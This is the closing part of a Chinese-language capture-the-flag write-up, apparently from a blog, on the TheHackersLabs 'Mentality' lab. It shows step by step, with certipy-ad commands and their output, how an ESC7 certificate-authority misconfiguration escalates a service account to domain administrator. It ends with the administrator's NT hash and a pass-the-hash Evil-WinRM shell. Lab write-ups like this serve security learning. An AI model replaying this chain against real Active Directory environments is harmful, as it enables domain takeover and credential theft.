+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found <span class="token number">33</span> certificate templates
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Finding certificate authorities
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found <span class="token number">1</span> certificate authority
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found <span class="token number">10</span> enabled certificate templates
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to resolve <span class="token string">'WIN-9FQTT7GPAVK.mentality.thl'</span> at <span class="token string">'192.168.56.28'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to get CA configuration <span class="token keyword">for</span> <span class="token string">'mentality-WIN-9FQTT7GPAVK-CA'</span> via CSRA
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to get DCOM connection for: <span class="token number">192.168</span>.56.28
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got CA configuration <span class="token keyword">for</span> <span class="token string">'mentality-WIN-9FQTT7GPAVK-CA'</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Resolved <span class="token string">'WIN-9FQTT7GPAVK.mentality.thl'</span> from cache: <span class="token number">192.168</span>.56.28
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Connecting to <span class="token number">192.168</span>.56.28:80
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enumeration output:
+Certificate Authorities
+  <span class="token number">0</span>
+    CA Name                             <span class="token builtin class-name">:</span> mentality-WIN-9FQTT7GPAVK-CA
+    DNS Name                            <span class="token builtin class-name">:</span> WIN-9FQTT7GPAVK.mentality.thl
+    Certificate Subject                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>mentality-WIN-9FQTT7GPAVK-CA, <span class="token assign-left variable">DC</span><span class="token operator">=</span>mentality, <span class="token assign-left variable">DC</span><span class="token operator">=</span>thl
+    Certificate Serial Number           <span class="token builtin class-name">:</span> 52F256456C27B2834A8DCCF7EE745646
+    Certificate Validity Start          <span class="token builtin class-name">:</span> <span class="token number">2025</span>-07-17 <span class="token number">13</span>:46:02+00:00
+    Certificate Validity End            <span class="token builtin class-name">:</span> <span class="token number">2045</span>-07-17 <span class="token number">13</span>:56:02+00:00
+    Web Enrollment                      <span class="token builtin class-name">:</span> Disabled
+    User Specified SAN                  <span class="token builtin class-name">:</span> Disabled
+    Request Disposition                 <span class="token builtin class-name">:</span> Issue
+    Enforce Encryption <span class="token keyword">for</span> Requests     <span class="token builtin class-name">:</span> Enabled
+    Permissions
+      Owner                             <span class="token builtin class-name">:</span> MENTALITY.THL<span class="token punctuation">\</span>Administrators
+      Access Rights
+        Enroll                          <span class="token builtin class-name">:</span> MENTALITY.THL<span class="token punctuation">\</span>Authenticated Users
+                                          MENTALITY.THL<span class="token punctuation">\</span>svcapp1
+        ManageCa                        <span class="token builtin class-name">:</span> MENTALITY.THL<span class="token punctuation">\</span>svcapp1
+                                          MENTALITY.THL<span class="token punctuation">\</span>Domain Admins
+                                          MENTALITY.THL<span class="token punctuation">\</span>Enterprise Admins
+                                          MENTALITY.THL<span class="token punctuation">\</span>Administrators
+        ManageCertificates              <span class="token builtin class-name">:</span> MENTALITY.THL<span class="token punctuation">\</span>Domain Admins
+                                          MENTALITY.THL<span class="token punctuation">\</span>Enterprise Admins
+                                          MENTALITY.THL<span class="token punctuation">\</span>Administrators
+    <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Vulnerabilities
+      ESC7                              <span class="token builtin class-name">:</span> <span class="token string">'MENTALITY.THL\\svcapp1'</span> has dangerous permissions
+Certificate Templates                   <span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not <span class="token function">find</span> any certificate templates</code></pre>
+
+<p>存在ESC7，<code>svcapp1</code>具有<code>ManageCa</code>权限</p>
+<p>先创建一个officer,就用svcapp1</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer svcapp1 -username svcapp1@mentality.thl -password 'Hola1234$'             </span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Successfully added officer <span class="token string">'svcapp1'</span> on <span class="token string">'mentality-WIN-9FQTT7GPAVK-CA'</span></code></pre>
+
+<p>然后启用证书模板并请求证书</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template SubCA -username svcapp1@mentality.thl -password 'Hola1234$'             </span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Successfully enabled <span class="token string">'SubCA'</span> on <span class="token string">'mentality-WIN-9FQTT7GPAVK-CA'</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template SubCA -username svcapp1@mentality.thl -password 'Hola1234$' -upn administrator@mentality.thl</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence <span class="token string">'\('</span>
+  <span class="token string">"(0x[a-zA-Z0-9]+) \([-]?[0-9]+ "</span>,
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting certificate via RPC
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Got error <span class="token keyword">while</span> trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class="token keyword">do</span> not allow the current user to enroll <span class="token keyword">for</span> this <span class="token builtin class-name">type</span> of certificate.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Request ID is <span class="token number">5</span>
+Would you like to save the private key? <span class="token punctuation">(</span>y/N<span class="token punctuation">)</span> y
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved private key to <span class="token number">5</span>.key
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Failed to request certificate</code></pre>
+
+
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request 5 -username svcapp1@mentality.thl -password 'Hola1234$'</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Successfully issued certificate</code></pre>
+
+<p>颁发成功后，然后注册域管的证书</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -u 'svcapp1@mentality.thl' -p 'Hola1234$' -target  'WIN-9FQTT7GPAVK.mentality.thl' -ns 192.168.56.28  -retrieve '5'</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Rerieving certificate with ID <span class="token number">5</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Successfully retrieved certificate
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got certificate with UPN <span class="token string">'administrator@mentality.thl'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Certificate has no object SID
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded private key from <span class="token string">'5.key'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved certificate and private key to <span class="token string">'administrator.pfx'</span></code></pre>
+
+<p>从证书中导出域管哈希</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.28  </span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using principal: administrator@mentality.thl
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to get TGT<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got TGT
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved credential cache to <span class="token string">'administrator.ccache'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to retrieve NT <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> <span class="token string">'administrator'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> <span class="token string">'administrator@mentality.thl'</span><span class="token builtin class-name">:</span> aad3b435b51404eeaad3b435b51404ee:058a4c99bab8b3d04a6bd959f95ce2b2</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># evil-winrm -i 192.168.56.28 -u administrator -H 058a4c99bab8b3d04a6bd959f95ce2b2</span>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
+mentality<span class="token punctuation">\</span>administrator</code></pre>
+
+
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/d94b1923/" title="thehackerslabs-Mentallity">http://ta0.fun/posts/d94b1923/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/3b1290b8/" rel="next" title="thehackerslabs-La Casa Del Jamón"><span class="post-nav-text">thehackerslabs-La Casa Del Jamón</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
